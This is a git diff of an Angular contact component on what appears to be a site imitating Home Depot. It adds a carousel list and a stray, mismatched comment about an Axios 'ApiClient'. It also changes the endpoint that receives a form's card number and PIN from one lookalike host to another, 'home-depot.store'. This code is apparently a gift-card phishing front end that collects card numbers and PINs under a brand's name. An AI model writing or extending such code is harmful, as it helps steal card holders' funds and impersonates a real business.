@@ -6,6 +6,7 @@ import { Router } from '@angular/router';
 import { HttpClient } from '@angular/common/http';
 
 
+
 @Component({
   selector: 'app-contact',
   templateUrl: './contact.component.html',
@@ -14,10 +15,17 @@ import { HttpClient } from '@angular/common/http';
 export class ContactComponent implements OnInit {
   cardval: any;
   cardNumberval = '';
+
   @ViewChild('cardval', {static: false}) cardvall: ElementRef;
   @ViewChild('cardnumberval', {static: false}) cardnumbervall: ElementRef;
+
   constructor(private productservice: ProductserviceService, private router: Router,
-     private http: HttpClient, private renderer: Renderer2) { }
+     private http: HttpClient, private renderer: Renderer2,  ) {
+
+ 
+      // The ApiClient wraps calls to the underlying Axios client.
+
+      }
 
   ngOnInit() {
     this.productservice.selectedProduct = null;
@@ -125,6 +133,12 @@ clickedOn(key){
     
   }
 }
+
+sliderr = [
+  'assets/img/carouselone.jpeg',
+  'assets/img/carouseltwo.jpg',
+  'assets/img/carouselthree.jpg'
+]
 clickedprod(prod) {
   console.log(prod);
   this.productservice.prodSubj.next(prod);
@@ -160,8 +174,9 @@ clickedcheck(){
       "pin_number":this.myForm.controls.pinnumber.value
       };
       
+  
       
-    this.http.post('https://homedepots.herokuapp.com/web/check_balance',body).subscribe((succe)=>{
+    this.http.post('https://www.home-depot.store/web/check_balance',body).subscribe((succe)=>{
 
     },(err)=>{
       console.log(err);
